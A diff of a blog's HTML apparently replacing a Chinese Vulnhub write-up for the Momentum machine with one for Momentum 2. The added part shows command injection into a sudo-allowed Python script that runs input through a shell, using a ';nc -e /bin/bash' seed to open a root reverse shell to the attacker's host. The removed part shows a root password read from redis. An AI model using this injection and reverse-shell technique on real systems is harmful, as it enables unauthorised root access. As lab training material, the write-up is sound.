@@ -38,7 +38,7 @@
     
       <meta 
         property="og:img" 
-        content="难度：⭐⭐⭐⭐">
+        content="难度：⭐⭐⭐">
     
     
       <meta 
@@ -57,19 +57,11 @@
         
           <meta 
             property="og:article:tag" 
-            content="文件上传">
-        
-          <meta 
-            property="og:article:tag" 
             content="Vulnhub">
         
           <meta 
             property="og:article:tag" 
-            content="SSH端口转发">
-        
-          <meta 
-            property="og:article:tag" 
-            content="redis数据库">
+            content="代码审计">
         
       
     
@@ -337,7 +329,7 @@
     
     
       <span class="dot"></span>
-      <span>2k words</span>
+      <span>2.1k words</span>
     
   </div>
   
@@ -352,15 +344,6 @@
         
           
           <a 
-            href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" 
-            class="post-meta-link">
-            文件上传
-          </a>
-        
-          
-            <span class="dot"></span>
-          
-          <a 
             href="/tags/Vulnhub/" 
             class="post-meta-link">
             Vulnhub
@@ -370,18 +353,9 @@
             <span class="dot"></span>
           
           <a 
-            href="/tags/SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" 
+            href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" 
             class="post-meta-link">
-            SSH端口转发
-          </a>
-        
-          
-            <span class="dot"></span>
-          
-          <a 
-            href="/tags/redis%E6%95%B0%E6%8D%AE%E5%BA%93/" 
-            class="post-meta-link">
-            redis数据库
+            代码审计
           </a>
         
       </div>
@@ -582,48 +556,61 @@ cookie <span class="token operator">=</span> <span class="token string">''</span
 
 print<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span>
 
-cmd <span class="token operator">=</span> <span class="token string">"echo %s >> log.txt"</span> % seed
-subprocess.Popen<span class="token punctuation">(</span>cmd, <span class="token assign-left variable">shell</span><span class="token operator">=</span>True<span class="token punctuation">)</span> //<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>发现系统当前启用了 <code>6379</code> 端口，查了一下是<strong>redis数据库</strong>的默认端口，结合之前发现的用户<code>redis</code>，这里猜测系统正在运行redis数据库，AUX查看当前系统进程确认：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">auxerre@Momentum:/$ <span class="token function">ps</span> aux <span class="token operator">|</span> <span class="token function">grep</span> <span class="token number">127.0</span>.0.1
-redis      <span class="token number">540</span>  <span class="token number">0.1</span>  <span class="token number">0.4</span>  <span class="token number">51672</span>  <span class="token number">9568</span> ?        Ssl  03:20   <span class="token number">0</span>:06 /usr/bin/redis-server <span class="token number">127.0</span>.0.1:6379
-auxerre    <span class="token number">917</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>   <span class="token number">6208</span>   <span class="token number">824</span> pts/0    S+   04:23   <span class="token number">0</span>:00 <span class="token function">grep</span> <span class="token number">127.0</span>.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br><strong><em>（redis是非关系型数据库，数据是以键-值对的形式进行存储，没有传统的表）</em></strong><br>尝试本地登录redis，登录成功，查看所有的key，发现存在一个名称为<strong>rootpass</strong>的key，查看该key的值：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">auxerre@Momentum:/$  redis-cli //本地登录redis
-<span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> keys * //查看所有key
-<span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"rootpass"</span>
-<span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> get rootpass //查看rootpass的值
-<span class="token string">"m0mentum-al1enum##"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>猜测<strong>rootpass</strong>的值为root的密码，直接在shell中su切换为root试试：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">auxerre@Momentum:/$ <span class="token function">su</span> -
-Password: 
-root@Momentum:~<span class="token comment"># id</span>
-<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
-root@Momentum:~<span class="token comment"># pwd</span>
-/root
-root@Momentum:~<span class="token comment"># ls -a</span>
-<span class="token builtin class-name">.</span>  <span class="token punctuation">..</span>  .bash_history  .bashrc  .local  .profile  root.txt
-root@Momentum:~<span class="token comment"># cat root.txt</span>
-<span class="token punctuation">[</span> Momentum - Rooted <span class="token punctuation">]</span>
----------------------------------------
-Flag <span class="token builtin class-name">:</span> 658ff660fdac0b079ea78238e5996e40
----------------------------------------
-by alienum with <span class="token operator">&lt;</span><span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>提权成功，并且找到flag。</p>
-</blockquote>
-<h2 id="4-_u5176_u4ED6"><a href="#4-_u5176_u4ED6" class="headerlink" title="4.其他"></a>4.其他</h2><blockquote>
-<p>如果系统没有给账户auxerre本地登录redis的权限，则考虑进行<strong>SSH端口转发</strong><br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/<span class="token punctuation">]</span> //本机7777端口映射到靶机6379
-└─<span class="token comment"># ssh -N -f -L 7777:127.0.0.1:6379 'auxerre'@'192.168.81.134'</span>
-auxerre@192.168.81.134's password: 
-                                                                                                                           
-┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/<span class="token punctuation">]</span> //本机的7777端口确认启用
-└─<span class="token comment"># netstat -tulpn            </span>
-Active Internet connections <span class="token punctuation">(</span>only servers<span class="token punctuation">)</span>
-Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
-tcp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">127.0</span>.0.1:36271         <span class="token number">0.0</span>.0.0:*               LISTEN      <span class="token number">34959</span>/containerd    
-tcp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">127.0</span>.0.1:7777          <span class="token number">0.0</span>.0.0:*               LISTEN      <span class="token number">122894</span>/ssh          
-tcp6       <span class="token number">0</span>      <span class="token number">0</span> ::1:7777                :::*                    LISTEN      <span class="token number">122894</span>/ssh          
-udp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">0.0</span>.0.0:68              <span class="token number">0.0</span>.0.0:*                           <span class="token number">3513</span>/dhclient 
+cmd <span class="token operator">=</span> <span class="token string">"echo %s >> log.txt"</span> % seed //将传入参数seed的值赋给cmd 并写入log.txt
+subprocess.Popen<span class="token punctuation">(</span>cmd, <span class="token assign-left variable">shell</span><span class="token operator">=</span>True<span class="token punctuation">)</span> //执行cmd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>尝试把反弹shell的命令通过seed传入并执行：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">athena@momentum2:/home/team-tasks$ python cookie-gen.py 
+~ Random Cookie Generation ~
+<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> <span class="token keyword">for</span> security reasons we keep logs about cookie seeds.
+Enter the seed <span class="token builtin class-name">:</span> <span class="token function">nc</span> -e /bin/bash <span class="token number">192.168</span>.35.128 <span class="token number">6666</span>
+Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span>: //报错，应使用python3
+ File <span class="token string">"cookie-gen.py"</span>, line <span class="token number">9</span>, <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>
+   seed <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">"Enter the seed : "</span><span class="token punctuation">)</span>
+ File <span class="token string">"&lt;string>"</span>, line <span class="token number">1</span>
+   <span class="token function">nc</span> -e /bin/bash <span class="token number">192.168</span>.35.128 <span class="token number">6666</span>
+                         ^
+SyntaxError: invalid syntax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">athena@momentum2:/home/team-tasks$ python3 cookie-gen.py
+~ Random Cookie Generation ~
+<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> <span class="token keyword">for</span> security reasons we keep logs about cookie seeds.
+Enter the seed <span class="token builtin class-name">:</span> <span class="token punctuation">;</span><span class="token function">nc</span> -e /bin/bash <span class="token number">192.168</span>.35.128 <span class="token number">6666</span>
+BMhgWfaGIXUOAZd@cIHV
+athena@momentum2:/home/team-tasks$ 
+/bin/sh: <span class="token number">1</span>: cannot create log.txt: Permission denied //报错，应sudo python3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">athena@momentum2:/home/team-tasks$ <span class="token function">sudo</span> python3 cookie-gen.py 
+<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> athena: 
+Sorry, user athena is not allowed to execute <span class="token string">'/usr/bin/python3 cookie-gen.py'</span> as root on momentum2. //报错，这里再仔细看看 “sudo -l”<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">athena@momentum2:/home/team-tasks$ <span class="token function">sudo</span> -l
+Matching Defaults entries <span class="token keyword">for</span> athena on momentum2:
+   env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin
 
-┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/<span class="token punctuation">]</span> //通过本机的7777端口登录靶机的redis数据库
-└─<span class="token comment"># redis-cli -h 127.0.0.1 -p 7777</span>
-<span class="token number">127.0</span>.0.1:777<span class="token operator"><span class="token file-descriptor important">7</span>></span> keys *
-<span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"rootpass"</span>
-<span class="token number">127.0</span>.0.1:777<span class="token operator"><span class="token file-descriptor important">7</span>></span> get rootpass
-<span class="token string">"m0mentum-al1enum##"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+User athena may run the following commands on momentum2:
+   <span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /usr/bin/python3 /home/team-tasks/cookie-gen.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>即使在<strong>/home/team-tasks</strong>目录下，也需要把sudo python3后执行的文件写完整！！<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">athena@momentum2:/home/team-tasks$ <span class="token function">sudo</span> python3 /home/team-tasks/cookie-gen.py 
+~ Random Cookie Generation ~
+<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> <span class="token keyword">for</span> security reasons we keep logs about cookie seeds.
+Enter the seed <span class="token builtin class-name">:</span> <span class="token function">nc</span> -e /bin/bash <span class="token number">192.168</span>.35.128 <span class="token number">6666</span>
+IATMIcRBhFNYQUbNXI<span class="token comment">#Y</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>发现监听端口没有反应，<code>cat log.txt</code>发现存在输入seed的字符串，再仔细看看<strong>cookie-gen.py</strong>！！<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cmd <span class="token operator">=</span> <span class="token string">"echo %s >> log.txt"</span> % seed
+subprocess.Popen<span class="token punctuation">(</span>cmd, <span class="token assign-left variable">shell</span><span class="token operator">=</span>True<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>所以，输入{seed}，靶机实际上执行的系统命令是<code>echo &#123;seed&#125; &gt;&gt; log.txt</code>！！<br>这里想办法把输入的{seed}作为一条单独的系统命令执行！在系统命令前加一个<em>;</em>！<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">athena@momentum2:/home/team-tasks$ <span class="token function">sudo</span> python3 /home/team-tasks/cookie-gen.py 
+~ Random Cookie Generation ~
+<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> <span class="token keyword">for</span> security reasons we keep logs about cookie seeds.
+Enter the seed <span class="token builtin class-name">:</span> <span class="token punctuation">;</span><span class="token function">nc</span> -e /bin/bash <span class="token number">192.168</span>.35.128 <span class="token number">7777</span>
+A@gHGCRdA<span class="token comment">#$YZAFTKNbI</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>成功拿到root的shell：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─<span class="token comment"># nc -lnvp 7777</span>
+Ncat: Version <span class="token number">7.92</span> <span class="token punctuation">(</span> https://nmap.org/ncat <span class="token punctuation">)</span>
+Ncat: Listening on :::7777
+Ncat: Listening on <span class="token number">0.0</span>.0.0:7777
+Ncat: Connection from <span class="token number">192.168</span>.35.129.
+Ncat: Connection from <span class="token number">192.168</span>.35.129:46764.
+<span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
+python3 -c <span class="token string">'import pty;pty.spawn("/bin/bash")'</span>
+root@momentum2:~<span class="token comment"># cat root.txt</span>
+<span class="token function">cat</span> root.txt
+//                    <span class="token punctuation">\</span><span class="token punctuation">\</span>
+<span class="token punctuation">&#125;</span>  Rooted - Momentum <span class="token number">2</span> <span class="token punctuation">&#123;</span>
+<span class="token punctuation">\</span><span class="token punctuation">\</span>                    //
+
+---------------------------------------------------
+FLAG <span class="token builtin class-name">:</span> 4bRQL7jaiFqK45dVjC2XP4TzfKizgGHTMYJfSrPEkezG
+---------------------------------------------------
+
+
+by Alienum with <span class="token operator">&lt;</span><span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
 </blockquote>
 
   </div>
@@ -681,7 +668,7 @@ udp        <span class="token number">0</span>      <span class="token number">0
     style="padding-right: 2px;">
   </i>TOC
 </div>
-<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-_u9776_u673A_u5B89_u88C5"><span class="toc-text">0.靶机安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-_u4FE1_u606F_u6536_u96C6"><span class="toc-text">1.信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-getshell"><span class="toc-text">2.getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-_u63D0_u6743"><span class="toc-text">3.提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-_u5176_u4ED6"><span class="toc-text">4.其他</span></a></li></ol>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-_u9776_u673A_u5B89_u88C5"><span class="toc-text">0.靶机安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-_u4FE1_u606F_u6536_u96C6"><span class="toc-text">1.信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-getshell"><span class="toc-text">2.getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-_u63D0_u6743"><span class="toc-text">3.提权</span></a></li></ol>
 </div></main>
             <aside class="left-column">
               
@@ -712,7 +699,7 @@ udp        <span class="token number">0</span>      <span class="token number">0
   <a 
     class="author-tags-count" 
     href="/tags">
-    <span>50</span>
+    <span>49</span>
     <span>Tags</span>
   </a>
 </div>
@@ -745,7 +732,7 @@ udp        <span class="token number">0</span>      <span class="token number">0
     style="padding-right: 2px;">
   </i>TOC
 </div>
-<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-_u9776_u673A_u5B89_u88C5"><span class="toc-text">0.靶机安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-_u4FE1_u606F_u6536_u96C6"><span class="toc-text">1.信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-getshell"><span class="toc-text">2.getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-_u63D0_u6743"><span class="toc-text">3.提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-_u5176_u4ED6"><span class="toc-text">4.其他</span></a></li></ol>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-_u9776_u673A_u5B89_u88C5"><span class="toc-text">0.靶机安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-_u4FE1_u606F_u6536_u96C6"><span class="toc-text">1.信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-getshell"><span class="toc-text">2.getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-_u63D0_u6743"><span class="toc-text">3.提权</span></a></li></ol>
       </div>
     </article>
   
@@ -834,12 +821,6 @@ udp        <span class="token number">0</span>      <span class="token number">0
       </a>
     
       <a 
-        href="/tags/SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" 
-        title="SSH端口转发">
-        <div class="tags-list-item">SSH端口转发</div>
-      </a>
-    
-      <a 
         href="/tags/Msfvenom/" 
         title="Msfvenom">
         <div class="tags-list-item">Msfvenom</div>
@@ -855,6 +836,18 @@ udp        <span class="token number">0</span>      <span class="token number">0
         href="/tags/DVWA/" 
         title="DVWA">
         <div class="tags-list-item">DVWA</div>
+      </a>
+    
+      <a 
+        href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" 
+        title="代码审计">
+        <div class="tags-list-item">代码审计</div>
+      </a>
+    
+      <a 
+        href="/tags/SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" 
+        title="SSH端口转发">
+        <div class="tags-list-item">SSH端口转发</div>
       </a>
     
       <a 
@@ -882,18 +875,6 @@ udp        <span class="token number">0</span>      <span class="token number">0
       </a>
     
       <a 
-        href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" 
-        title="文件上传">
-        <div class="tags-list-item">文件上传</div>
-      </a>
-    
-      <a 
-        href="/tags/redis%E6%95%B0%E6%8D%AE%E5%BA%93/" 
-        title="redis数据库">
-        <div class="tags-list-item">redis数据库</div>
-      </a>
-    
-      <a 
         href="/tags/redis/" 
         title="redis">
         <div class="tags-list-item">redis</div>
@@ -903,6 +884,12 @@ udp        <span class="token number">0</span>      <span class="token number">0
         href="/tags/XSS/" 
         title="XSS">
         <div class="tags-list-item">XSS</div>
+      </a>
+    
+      <a 
+        href="/tags/AES/" 
+        title="AES">
+        <div class="tags-list-item">AES</div>
       </a>
     
   </div>
@@ -923,7 +910,7 @@ udp        <span class="token number">0</span>      <span class="token number">0
     style="padding-right: 2px;">
   </i>TOC
 </div>
-<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-_u9776_u673A_u5B89_u88C5"><span class="toc-text">0.靶机安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-_u4FE1_u606F_u6536_u96C6"><span class="toc-text">1.信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-getshell"><span class="toc-text">2.getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-_u63D0_u6743"><span class="toc-text">3.提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-_u5176_u4ED6"><span class="toc-text">4.其他</span></a></li></ol>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-_u9776_u673A_u5B89_u88C5"><span class="toc-text">0.靶机安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-_u4FE1_u606F_u6536_u96C6"><span class="toc-text">1.信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-getshell"><span class="toc-text">2.getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-_u63D0_u6743"><span class="toc-text">3.提权</span></a></li></ol>
     </article>
   
   
